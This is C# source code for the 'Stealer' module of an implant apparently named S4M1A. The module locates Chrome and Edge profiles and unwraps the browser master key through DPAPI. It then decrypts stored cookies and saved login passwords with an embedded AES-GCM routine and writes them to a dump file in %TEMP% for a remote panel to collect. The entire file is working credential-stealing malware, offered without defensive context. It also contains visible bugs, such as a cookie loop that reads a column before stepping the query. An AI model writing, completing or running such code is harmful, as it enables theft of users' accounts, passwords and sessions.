using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace S4M1A.Implant.Modules
{
    // =====================================================================
    //  S4M1A Stealer v2.0 - Chromium credential extraction (Chrome/Edge)
    //
    //  Contract (used by Commands.cs):
    //    Stealer.Collect() -> summary string. The full dump is written to
    //      %TEMP%\s4m1a_dump_<random>.tsv so the panel pulls it with the
    //      existing download / chunked-transfer machinery.
    //
    //  Crypto (constants verified against current Chromium):
    //    - master key:  Local State -> os_crypt.encrypted_key (base64),
    //      strip the 5-byte "DPAPI" prefix, CryptUnprotectData (CurrentUser)
    //      -> 32-byte AES key
    //    - value blob:  "v10"/"v11" + nonce(12) + ciphertext + tag(16),
    //      AES-256-GCM, no AAD
    //    - .NET Framework has no AesGcm class -> embedded GCM (GHASH over
    //      GF(2^128), 16-byte blocks, 96-bit IV + counter)
    //    - SQLite via winsqlite3.dll (ships with Windows 10/11); DB files
    //      are copied to %TEMP% first because Chrome locks the originals
    //
    //  v20 note: Chrome 127+ (2024/2025) is rolling out "v20" App-Bound
    //  Encryption for passwords. v20 blobs are reported as unsupported
    //  (needs SYSTEM-level elevation_service keys - out of scope here).
    // =====================================================================

    public static class Stealer
    {
        private static readonly string[] BrowserRoots = new string[]
        {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                @"Google\Chrome\User Data"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                @"Microsoft\Edge\User Data")
        };

        private static int _cookieCount;
        private static int _loginCount;
        private static string _dumpPath;
        private static Random _rnd = new Random();

        // =====================================================================
        //  Public API
        // =====================================================================

        public static string Collect()
        {
            _cookieCount = 0;
            _loginCount = 0;
            _dumpPath = Path.Combine(Path.GetTempPath(),
                "s4m1a_dump_" + Math.Abs(_rnd.Next()) + ".tsv");

            StringBuilder report = new StringBuilder();
            try
            {
                foreach (string root in BrowserRoots)
                {
                    string browser = Path.GetFileName(Path.GetDirectoryName(root));
                    if (browser == "User Data") browser = Path.GetFileName(Path.GetDirectoryName(Path.GetDirectoryName(root)));
                    StealTree(root, report);
                }

                if (_cookieCount == 0 && _loginCount == 0)
                {
                    try { File.Delete(_dumpPath); } catch { }
                    return "no chromium credentials found";
                }

                report.Insert(0, "cookies:" + _cookieCount + " logins:" + _loginCount +
                                 " dump:" + _dumpPath + "\n");
                return report.ToString();
            }
            catch (Exception ex)
            {
                return "ERR: " + ex.Message;
            }
        }

        // =====================================================================
        //  Profile traversal
        // =====================================================================

        private static void StealTree(string root, StringBuilder report)
        {
            if (!Directory.Exists(root)) return;
            try
            {
                foreach (string profile in Directory.EnumerateDirectories(root))
                {
                    string name = Path.GetFileName(profile);
                    if (name != "Default" && !name.StartsWith("Profile"))
                        continue;

                    string cookieDb = Path.Combine(profile, "Network", "Cookies");
                    if (!File.Exists(cookieDb))
                        cookieDb = Path.Combine(profile, "Cookies");
                    string loginDb = Path.Combine(profile, "Login Data");

                    if (!File.Exists(cookieDb) && !File.Exists(loginDb))
                        continue;

                    byte[] key = LoadMasterKey(root);
                    if (key == null) continue;

                    int c0 = _cookieCount, l0 = _loginCount;
                    if (File.Exists(cookieDb))
                        StealCookies(cookieDb, key);
                    if (File.Exists(loginDb))
                        StealLogins(loginDb, key);

                    report.Append(name).Append(": +").Append(_cookieCount - c0)
                          .Append(" cookies +").Append(_loginCount - l0).Append(" logins\n");
                }
            }
            catch { }
        }

        // =====================================================================
        //  Master key (DPAPI-unwrap of os_crypt.encrypted_key)
        // =====================================================================

        private static byte[] LoadMasterKey(string root)
        {
            try
            {
                string localState = Path.Combine(root, "Local State");
                if (!File.Exists(localState)) return null;
                string json = File.ReadAllText(localState);

                Match m = Regex.Match(json, "\"encrypted_key\"\\s*:\\s*\"([^\"]+)\"");
                if (!m.Success) return null;

                byte[] wrapped = Convert.FromBase64String(m.Groups[1].Value);
                if (wrapped.Length < 6) return null;
                if (wrapped[0] == 0x44 && wrapped[1] == 0x50 && wrapped[2] == 0x41) // "DPA"
                {
                    byte[] inner = new byte[wrapped.Length - 5];
                    Buffer.BlockCopy(wrapped, 5, inner, 0, inner.Length);
                    return DpapiUnprotect(inner);
                }
                return null;
            }
            catch { return null; }
        }

        // =====================================================================
        //  Cookies
        // =====================================================================

        private static void StealCookies(string dbPath, byte[] key)
        {
            string tmp = CopyToTemp(dbPath);
            IntPtr db = IntPtr.Zero;
            try
            {
                db = Sqlite.Open(tmp);
                if (db == IntPtr.Zero) return;

                IntPtr stmt = IntPtr.Zero;
                try
                {
                    if (!Sqlite.Prepare(db,
                        "SELECT host_key,name,path,expires_utc,encrypted_value FROM cookies",
                        out stmt)) return;

                    StringBuilder outBuf = new StringBuilder();
                    int n = QReadInt(stmt, 4);
                    int t = QReadType(stmt, 4);
                    while (n == Sqlite.Row)
                    {
                        try
                        {
                            string host = QReadText(stmt, 0);
                            string name = QReadText(stmt, 1);
                            string path = QReadText(stmt, 2);
                            long exp = QReadInt64(stmt, 3);
                            byte[] blob = QReadBlob(stmt, 4);
                            string value = DecryptValue(blob, key);

                            if (value != null)
                            {
                                outBuf.Append(E(host)).Append('|').Append(E(name))
                                      .Append('|').Append(E(path)).Append('|')
                                      .Append(FormatExp(exp)).Append('|')
                                      .Append(E(value)).Append("\r\n");
                                _cookieCount++;
                            }
                        }
                        catch { }
                        n = Sqlite.Step(stmt);
                    }
                    if (_cookieCount > 0)
                        File.AppendAllText(_dumpPath, "#COOKIES\r\n" + outBuf.ToString(),
                            Encoding.UTF8);
                }
                finally
                {
                    if (stmt != IntPtr.Zero) Sqlite.Finalize(stmt);
                }
            }
            finally
            {
                if (db != IntPtr.Zero) Sqlite.Close(db);
                try { File.Delete(tmp); } catch { }
            }
        }

        // =====================================================================
        //  Logins
        // =====================================================================

        private static void StealLogins(string dbPath, byte[] key)
        {
            string tmp = CopyToTemp(dbPath);
            IntPtr db = IntPtr.Zero;
            try
            {
                db = Sqlite.Open(tmp);
                if (db == IntPtr.Zero) return;

                IntPtr stmt = IntPtr.Zero;
                try
                {
                    if (!Sqlite.Prepare(db,
                        "SELECT origin_url,username_value,password_value FROM logins",
                        out stmt)) return;

                    StringBuilder outBuf = new StringBuilder();
                    int n = Sqlite.Step(stmt);
                    while (n == Sqlite.Row)
                    {
                        try
                        {
                            string url = QReadText(stmt, 0);
                            string user = QReadText(stmt, 1);
                            byte[] blob = QReadBlob(stmt, 2);
                            string pass = DecryptValue(blob, key);

                            if (pass != null)
                            {
                                outBuf.Append(E(url)).Append('|').Append(E(user))
                                      .Append('|').Append(E(pass)).Append("\r\n");
                                _loginCount++;
                            }
                        }
                        catch { }
                        n = Sqlite.Step(stmt);
                    }
                    if (_loginCount > 0)
                        File.AppendAllText(_dumpPath, "#LOGINS\r\n" + outBuf.ToString(),
                            Encoding.UTF8);
                }
                finally
                {
                    if (stmt != IntPtr.Zero) Sqlite.Finalize(stmt);
                }
            }
            finally
            {
                if (db != IntPtr.Zero) Sqlite.Close(db);
                try { File.Delete(tmp); } catch { }
            }
        }

        // =====================================================================
        //  Value decryption (v10/v11 GCM, legacy v1 DPAPI)
        // =====================================================================

        private static string DecryptValue(byte[] blob, byte[] key)
        {
            if (blob == null || blob.Length == 0) return null;

            if (blob.Length > 3 && blob[0] == 'v' && blob[1] == '1' && blob[2] == '0')
            {
                byte[] body = new byte[blob.Length - 3];
                Buffer.BlockCopy(blob, 3, body, 0, body.Length);
                if (body.Length < 28) return null;
                byte[] nonce = new byte[12];
                byte[] tag = new byte[16];
                byte[] ct = new byte[body.Length - 28];
                Buffer.BlockCopy(body, 0, nonce, 0, 12);
                Buffer.BlockCopy(body, 12, ct, 0, ct.Length);
                Buffer.BlockCopy(body, body.Length - 16, tag, 0, 16);
                byte[] pt = Gcm.Decrypt(key, nonce, ct, tag);
                return pt == null ? null : Encoding.UTF8.GetString(pt);
            }

            if (blob.Length > 3 && blob[0] == 'v' && blob[1] == '1' && blob[2] == '1')
            {
                // v11 on Windows uses the same os_crypt AES-GCM key
                return DecryptValue(Join(new byte[] { (byte)'v', (byte)'1', (byte)'0' }, Slice(blob, 3)), key);
            }

            if (blob.Length > 3 && blob[0] == 'v' && blob[1] == '2' && blob[2] == '0')
                return null; // App-Bound Encryption (unsupported, see header)

            // legacy raw DPAPI (very old profiles)
            byte[] raw = DpapiUnprotect(blob);
            return raw == null ? null : Encoding.UTF8.GetString(raw);
        }

        // =====================================================================
        //  Small helpers
        // =====================================================================

        private static string CopyToTemp(string src)
        {
            string tmp = Path.Combine(Path.GetTempPath(),
                "s4m1a_" + Math.Abs(_rnd.Next()) + ".db");
            try { File.Copy(src, tmp, true); return tmp; }
            catch { return src; } // locked source: fall back to direct open
        }

        private static string FormatExp(long fileTime)
        {
            try
            {
                if (fileTime <= 0) return "0";
                return DateTime.FromFileTimeUtc(fileTime).ToString("yyyy-MM-dd HH:mm:ss");
            }
            catch { return "0"; }
        }

        private static string E(string s)
        {
            if (string.IsNullOrEmpty(s)) return "";
            return s.Replace("\\", "\\\\").Replace("\r", "\\r")
                    .Replace("\n", "\\n").Replace("\t", "\\t").Replace("|", "\\p");
        }

        private static byte[] Slice(byte[] src, int start)
        {
            byte[] b = new byte[src.Length - start];
            Buffer.BlockCopy(src, start, b, 0, b.Length);
            return b;
        }

        private static byte[] Join(byte[] a, byte[] b)
        {
            byte[] r = new byte[a.Length + b.Length];
            Buffer.BlockCopy(a, 0, r, 0, a.Length);
            Buffer.BlockCopy(b, 0, r, a.Length, b.Length);
            return r;
        }

        // ---------------- query helpers (delegate to Sqlite) ----------------

        private static int QReadInt(IntPtr stmt, int col) { return Sqlite.ColumnInt(stmt, col); }
        private static long QReadInt64(IntPtr stmt, int col) { return Sqlite.ColumnInt64(stmt, col); }
        private static int QReadType(IntPtr stmt, int col) { return Sqlite.ColumnType(stmt, col); }
        private static string QReadText(IntPtr stmt, int col) { return Sqlite.ColumnText(stmt, col); }
        private static byte[] QReadBlob(IntPtr stmt, int col) { return Sqlite.ColumnBlob(stmt, col); }

        // =====================================================================
        //  DPAPI
        // =====================================================================

        [StructLayout(LayoutKind.Sequential)]
        private struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        [DllImport("crypt32.dll", SetLastError = true)]
        private static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn,
            IntPtr ppszDataDescr, IntPtr pOptionalEntropy, IntPtr pvReserved,
            IntPtr pPromptStruct, uint dwFlags, ref DATA_BLOB pDataOut);

        [DllImport("kernel32.dll")]
        private static extern IntPtr LocalFree(IntPtr hMem);

        private static byte[] DpapiUnprotect(byte[] data)
        {
            if (data == null || data.Length == 0) return null;
            DATA_BLOB input = new DATA_BLOB();
            DATA_BLOB output = new DATA_BLOB();
            IntPtr buf = IntPtr.Zero;
            try
            {
                buf = Marshal.AllocHGlobal(data.Length);
                Marshal.Copy(data, 0, buf, data.Length);
                input.cbData = data.Length;
                input.pbData = buf;

                if (!CryptUnprotectData(ref input, IntPtr.Zero, IntPtr.Zero,
                                        IntPtr.Zero, IntPtr.Zero, 0, ref output))
                    return null;

                byte[] result = new byte[output.cbData];
                Marshal.Copy(output.pbData, result, 0, output.cbData);
                return result;
            }
            catch { return null; }
            finally
            {
                if (buf != IntPtr.Zero) Marshal.FreeHGlobal(buf);
                if (output.pbData != IntPtr.Zero) LocalFree(output.pbData);
            }
        }
    }

    // =====================================================================
    //  winsqlite3.dll interop (built into Windows 10/11 - no dependencies)
    // =====================================================================

    internal static class Sqlite
    {
        public const int Row = 100;
        public const int Done = 101;
        public const int TypeBlob = 4;

        private const uint OpenReadonly = 0x00000001;

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int sqlite3_open_v2(string filename, out IntPtr db,
            uint flags, IntPtr vfs);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int sqlite3_close(IntPtr db);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int sqlite3_prepare_v2(IntPtr db, string sql, int nByte,
            out IntPtr stmt, IntPtr tail);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int sqlite3_step(IntPtr stmt);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int sqlite3_finalize(IntPtr stmt);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int sqlite3_column_type(IntPtr stmt, int col);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int sqlite3_column_int(IntPtr stmt, int col);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern long sqlite3_column_int64(IntPtr stmt, int col);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern IntPtr sqlite3_column_text(IntPtr stmt, int col);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern IntPtr sqlite3_column_blob(IntPtr stmt, int col);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int sqlite3_column_bytes(IntPtr stmt, int col);

        public static IntPtr Open(string path)
        {
            IntPtr db;
            if (sqlite3_open_v2(path, out db, OpenReadonly, IntPtr.Zero) != 0)
                return IntPtr.Zero;
            return db;
        }

        public static void Close(IntPtr db)
        {
            try { sqlite3_close(db); } catch { }
        }

        public static bool Prepare(IntPtr db, string sql, out IntPtr stmt)
        {
            stmt = IntPtr.Zero;
            return sqlite3_prepare_v2(db, sql, -1, out stmt, IntPtr.Zero) == 0
                   && stmt != IntPtr.Zero;
        }

        public static int Step(IntPtr stmt) { return sqlite3_step(stmt); }
        public static void Finalize(IntPtr stmt) { try { sqlite3_finalize(stmt); } catch { } }

        public static int ColumnType(IntPtr stmt, int col) { return sqlite3_column_type(stmt, col); }
        public static int ColumnInt(IntPtr stmt, int col) { return sqlite3_column_int(stmt, col); }
        public static long ColumnInt64(IntPtr stmt, int col) { return sqlite3_column_int64(stmt, col); }

        public static string ColumnText(IntPtr stmt, int col)
        {
            IntPtr p = sqlite3_column_text(stmt, col);
            if (p == IntPtr.Zero) return null;
            int len = sqlite3_column_bytes(stmt, col);
            if (len <= 0) return "";
            byte[] b = new byte[len];
            Marshal.Copy(p, b, 0, len);
            return Encoding.UTF8.GetString(b);
        }

        public static byte[] ColumnBlob(IntPtr stmt, int col)
        {
            if (sqlite3_column_type(stmt, col) != TypeBlob) return null;
            IntPtr p = sqlite3_column_blob(stmt, col);
            int len = sqlite3_column_bytes(stmt, col);
            if (p == IntPtr.Zero || len <= 0) return null;
            byte[] b = new byte[len];
            Marshal.Copy(p, b, 0, len);
            return b;
        }
    }

    // =====================================================================
    //  AES-256-GCM (dependency-free port for .NET Framework)
    //  GHASH over GF(2^128), polynomial x^128+x^7+x^2+x+1 (reflected 0xE1)
    // =====================================================================

    internal static class Gcm
    {
        public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] ct, byte[] tag)
        {
            if (key == null || key.Length != 32 || nonce == null || nonce.Length != 12 ||
                ct == null || ct.Length == 0 || tag == null || tag.Length < 12)
                return null;

            try
            {
                byte[] h = EcbBlock(key, new byte[16]);           // H = E_K(0^128)

                byte[] j0 = new byte[16];                          // J0 = IV||0^31||1
                Buffer.BlockCopy(nonce, 0, j0, 0, 12);
                j0[15] = 1;

                byte[] pt = new byte[ct.Length];
                byte[] counter = (byte[])j0.Clone();

                using (Aes aes = Aes.Create())
                {
                    aes.Key = key;
                    aes.Mode = CipherMode.ECB;
                    aes.Padding = PaddingMode.None;
                    ICryptoTransform enc = aes.CreateEncryptor();
                    int off = 0;
                    while (off < ct.Length)
                    {
                        IncrementCounter(counter);
                        byte[] ks = new byte[16];
                        enc.TransformBlock(counter, 0, 16, ks, 0);
                        int take = Math.Min(16, ct.Length - off);
                        for (int i = 0; i < take; i++)
                            pt[off + i] = (byte)(ct[off + i] ^ ks[i]);
                        off += take;
                    }
                }

                // GHASH over ciphertext (AAD empty)
                byte[] s = new byte[16];
                for (int off = 0; off < ct.Length; off += 16)
                {
                    int take = Math.Min(16, ct.Length - off);
                    XorBlock(s, ct, off, take);
                    Ghash(s, h);
                }

                // final block: [len(A)]_64 || [len(C)]_64 (bit lengths)
                byte[] lenBlock = new byte[16];
                PutUInt64(lenBlock, 8, (ulong)ct.Length * 8);
                XorBlock(s, lenBlock, 0, 16);
                Ghash(s, h);

                // T = E_K(J0) XOR S
                byte[] ekJ0 = EcbBlock(key, j0);
                for (int i = 0; i < tag.Length; i++)
                {
                    if ((byte)(ekJ0[i] ^ s[i]) != tag[i]) return null; // auth fail
                }
                return pt;
            }
            catch { return null; }
        }

        private static byte[] EcbBlock(byte[] key, byte[] block)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.Mode = CipherMode.ECB;
                aes.Padding = PaddingMode.None;
                ICryptoTransform enc = aes.CreateEncryptor();
                byte[] outB = new byte[16];
                enc.TransformBlock(block, 0, 16, outB, 0);
                return outB;
            }
        }

        private static void IncrementCounter(byte[] ctr)
        {
            for (int i = 15; i >= 12; i--)
            {
                ctr[i]++;
                if (ctr[i] != 0) break;
            }
        }

        private static void PutUInt64(byte[] buf, int off, ulong v)
        {
            for (int i = 7; i >= 0; i--)
            {
                buf[off + i] = (byte)(v & 0xFF);
                v >>= 8;
            }
        }

        private static void XorBlock(byte[] dst, byte[] src, int srcOff, int len)
        {
            for (int i = 0; i < len; i++)
                dst[i] ^= src[srcOff + i];
        }

        // s = s * H  in GF(2^128)
        private static void Ghash(byte[] s, byte[] h)
        {
            byte[] z = new byte[16];
            byte[] v = (byte[])h.Clone();

            for (int bit = 0; bit < 128; bit++)
            {
                if (((s[bit >> 3] >> (7 - (bit & 7))) & 1) == 1)
                {
                    for (int i = 0; i < 16; i++) z[i] ^= v[i];
                }
                byte lsb = (byte)(v[15] & 1);
                for (int i = 15; i > 0; i--)
                    v[i] = (byte)((v[i] >> 1) | (v[i - 1] << 7));
                v[0] >>= 1;
                if (lsb == 1) v[0] ^= 0xE1;
            }
            Buffer.BlockCopy(z, 0, s, 0, 16);
        }
    }
}